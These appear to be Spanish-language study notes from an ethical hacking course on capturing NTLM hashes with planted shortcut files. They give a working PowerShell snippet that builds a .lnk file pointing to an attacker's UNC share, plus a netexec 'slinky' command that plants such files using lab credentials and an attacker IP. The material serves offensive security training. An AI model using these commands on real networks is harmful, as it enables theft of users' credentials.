
Los ataques mediante accesos directos consisten en aprovechar carpetas compartidas accesibles para todos los usuarios. En este caso, podemos crear un acceso directo que apunte a un recurso de red inexistente. Al tener `Responder` activo en nuestra máquina, cuando un usuario intente abrir el acceso directo, su sistema buscará el recurso inexistente, enviando automáticamente sus credenciales NTLM, las cuales podremos capturar.




Esto lo podemos hacer desde cualquier maquina, no tiene por que ser la maquina victima, ya que despues podemos compiar el archivo generado y moverlo a la carpeta que queramos.

```powershell
$objShell = New-Object -ComObject WScript.shell $lnk = $objShell.CreateShortcut("C:\test.lnk") $lnk.TargetPath = "\\192.168.138.149\@test.png" $lnk.WindowStyle = 1 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3" $lnk.Description = "Test" $lnk.HotKey = "Ctrl+Alt+T" $lnk.Save()
```



Si queremos que nos lleguen hashes y tenemos alguna pass, podemos usar slinky de netexec o crackmapexec

```bash
netexec smb 192.168.0.231 -d marvel.local -u fcastle -p Mypassword1234! -M slinky -M slinky -o NAME=<LNK file name> SERVER=<attacker IP>
```


https://academy.tcm-sec.com/courses/practical-ethical-hacking-the-complete-course/lectures/33637401